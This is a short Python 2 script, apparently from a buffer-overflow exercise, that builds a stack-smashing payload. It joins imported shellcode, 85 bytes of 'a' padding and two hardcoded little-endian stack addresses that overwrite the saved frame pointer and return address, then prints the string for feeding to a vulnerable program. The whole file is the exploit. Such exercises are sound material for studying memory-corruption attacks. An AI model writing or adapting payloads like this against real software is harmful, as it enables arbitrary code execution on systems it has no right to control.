from shellcode import shellcode
ebpret = ("\xf8\xf9\xfe\xbf\x6c\xf9\xfe\xbf") 
str1 = shellcode + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" + ebpret
print str1
